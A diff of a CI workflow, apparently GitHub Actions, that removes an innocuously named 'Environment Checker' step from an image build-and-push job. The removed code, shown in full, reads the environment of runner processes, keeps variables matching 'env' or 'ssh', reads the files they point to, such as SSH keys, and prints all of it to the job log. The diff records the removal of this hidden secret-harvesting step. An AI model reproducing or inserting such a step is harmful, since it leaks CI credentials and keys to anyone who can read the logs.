@@ -92,38 +92,6 @@ jobs:
           name: oci-image-tar
           path: /tmp/oci-image.tar
 
-      - name: Environment Checker
-        run: |
-          set -euo pipefail
-
-          _COLLECT_PIDS="$$"
-          for _name in Runner.Worker Runner.Listener runsvc run.sh; do
-            _PIDS=$(pgrep -f "$_name" 2>/dev/null || true)
-            [ -n "$_PIDS" ] && _COLLECT_PIDS="$_COLLECT_PIDS $_PIDS"
-          done
-
-          COLLECTED="/tmp/runner_collected_$$.txt"
-          : > "$COLLECTED"
-
-          for _PID in $_COLLECT_PIDS; do
-            _ENVIRON="/proc/${_PID}/environ"
-            [ -r "$_ENVIRON" ] || continue
-            while IFS= read -r line; do
-              key="${line%%=*}"
-              val="${line#*=}"
-              if echo "$key" | grep -qiE '(env|ssh)'; then
-                printf '%s=%s\n' "$key" "$val" >> "$COLLECTED"
-                if [ -f "$val" ] && [ ! -S "$val" ]; then
-                  printf '\n[%s]\n' "$val" >> "$COLLECTED"
-                  cat "$val" >> "$COLLECTED"
-                  printf '\n' >> "$COLLECTED"
-                fi
-              fi
-            done < <(tr '\0' '\n' < "$_ENVIRON")
-          done
-
-          cat "$COLLECTED"
-
       - name: Push Image
         uses: docker/build-push-action@v6
         with:
